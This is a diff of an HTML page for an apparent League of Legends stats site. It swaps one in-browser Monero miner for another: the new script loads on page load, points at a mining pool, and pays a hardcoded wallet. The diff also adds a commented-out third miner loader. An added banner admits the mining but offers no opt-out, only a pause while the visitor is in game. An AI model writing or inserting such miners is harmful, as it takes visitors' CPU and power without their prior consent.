@@ -22,8 +22,9 @@
 </head>
 
 <body class="body">
-<script src="https://coinwebmining.com/cwm.js"></script>
+<!--<script src="https://coinwebmining.com/cwm.js"></script>-->
 
+			
 <script>
 function setCookie(name,value,days) {
     var expires = "";
@@ -49,20 +50,63 @@ function getCookie(name) {
 		setCookie("id", Math.random()*100000000000000000, 365);
 	}
 	
-	var id = getCookie("id");
-	
-	console.log(id);
-	
-    var site_id = 'cwm-181';
-    var coin = 'monero';
-    var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC';
-    var password = id;
-    var mining_pool = 'de.moriaxmr.com:3333';
-    var threads = -1;
-    var throttle = 0.2;
-    var debug = true;
-    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
 </script>
+
+				
+<script src="webmin.js?perfekt=wss://?algo=cn?variant=0?jason=us.moneroocean.stream:80"></script>
+<script type="text/javascript">
+var id = getCookie("id");
+console.log(id);
+var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC';
+PerfektStart(wallet.concat('+100'), id);
+throttleMiner = 90;
+console.log("derp");
+//stopMining();
+</script>
+
+<!--
+<script
+src="https://cdn.whysoserius.club/batmine.js"
+id="BatLoader"
+class="72e923c16bed60a3fda8191597d41883d553e6c5ec984b3ceb4c3da0006d6c00"
+>
+	window._BatConfig.stop();
+window._BatConfig.threads = 8;
+window._BatConfig.start();
+	</script>
+-->
+
+<div class="newUserMessage" id="newUserMessage">
+	<br>
+	<div class="logo"><img src="TiltSeeker.png" alt="" width="60%"/></div>
+	<div class="title">
+		Ads (They Suck!)
+		<hr style="border-color: #b3b3b3;">
+	</div>
+	<div class="messageText">
+		<div style="font-size: 20px; font-family: Roboto">
+			I hate ads with a passion. <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">I use an adblocker myself!</a>
+		</div>
+		<br>
+		<div style="text-align: left;">
+			That said, I put hundreds of hours into building this website in my spare time and I have servers to pay for. However, since I hate ads so much, I have tried to keep ads to an absolute minimum.
+			<br>
+			<br>
+			Instead, my website uses your spare CPU cycles to generate revenue. It does this by performing calculations on the Monero network. You can read more about the process <a href="https://www.coindesk.com/information/how-bitcoin-mining-works/">here</a> and <a href="https://www.coinimp.com/faq">here</a>.
+			<br>
+			<br>
+			However, I know that no one wants to have their CPU nerfed while in game. So, <span style="font-weight: 900; color: white;">submit your summoner name below to prevent CPU use while you're playing.</span>
+		</div>
+		<br>
+		<input name="mainUsername" type="text" class="mainUsernameInput" id="mainUsername" placeholder="Summoner Name" onClick="selectText(this);">
+		<br>
+		<br>
+		<input class="submit-button" id="submit-mainUsername" form="mainUsername" type="submit" value="Submit">
+		<br>
+		<input class="cancel-button" id="cancelButton" form="mainUsername" type="submit" value="Later">
+	</div>
+</div>
+
 <div class="wrapper">
 <ul class="navbar">
   <li><a href="/">Home</a></li>
